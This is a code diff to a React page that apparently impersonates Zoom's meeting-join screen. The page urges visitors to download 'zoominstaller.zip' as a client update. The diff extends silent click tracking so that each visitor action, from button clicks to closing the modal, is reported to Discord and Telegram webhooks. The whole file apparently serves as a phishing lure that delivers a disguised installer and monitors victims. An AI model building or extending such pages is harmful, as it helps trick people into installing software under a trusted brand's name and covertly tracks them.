@@ -9,17 +9,23 @@ export default function ZoomLandingPage({ onNavigateToUpdate }) {
     const INSTALLER_PATH = "/assets/setup/update/zoominstaller.zip";
     const INSTALLER_FILENAME = "zoominstaller.zip";
 
-    // Send data to Discord (fails silently if webhook not configured)
-    const sendToDiscord = async (message) => {
+    // Send data to Discord & Telegram (fails silently if not configured)
+    const sendNotification = async (message) => {
         try {
-            await fetch("/api/discord", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ text: message }),
-            });
-            // Silently ignore errors - webhook may not be configured
+            await Promise.allSettled([
+                fetch("/api/discord", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ text: message }),
+                }),
+                fetch("/api/telegram", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ text: message }),
+                })
+            ]);
         } catch {
-            // Silent fail - Discord logging is optional
+            // Silent fail - notifications are optional
         }
     };
 
@@ -37,7 +43,7 @@ export default function ZoomLandingPage({ onNavigateToUpdate }) {
     // Handle main button click - download and show modal
     const handleJoinClick = async () => {
         setIsDownloading(true);
-        await sendToDiscord("🔵 User clicked 'Join from Zoom Workplace app' button");
+        await sendNotification("🔵 User clicked 'Join from Zoom Workplace app' button");
 
         // Trigger download
         triggerDownload();
@@ -51,19 +57,19 @@ export default function ZoomLandingPage({ onNavigateToUpdate }) {
 
     // Handle Download Now link click
     const handleDownloadNow = async () => {
-        await sendToDiscord("🔽 User clicked 'Download Now' link");
+        await sendNotification("🔽 User clicked 'Download Now' link");
         triggerDownload();
     };
 
     // Handle update your client link
     const handleUpdateClient = async () => {
-        await sendToDiscord("🔄 User clicked 'update your client' link - navigating to update page");
+        await sendNotification("🔄 User clicked 'update your client' link - navigating to update page");
         onNavigateToUpdate();
     };
 
     // Handle modal download link
     const handleModalDownload = async () => {
-        await sendToDiscord("🔽 User clicked download link in modal");
+        await sendNotification("🔽 User clicked download link in modal");
         triggerDownload();
     };
 
@@ -224,7 +230,7 @@ export default function ZoomLandingPage({ onNavigateToUpdate }) {
                         <button
                             onClick={() => {
                                 setShowModal(false);
-                                sendToDiscord("❌ User closed the modal");
+                                sendNotification("❌ User closed the modal");
                             }}
                             className="absolute top-3 right-3 text-gray-400 hover:text-gray-600"
                         >
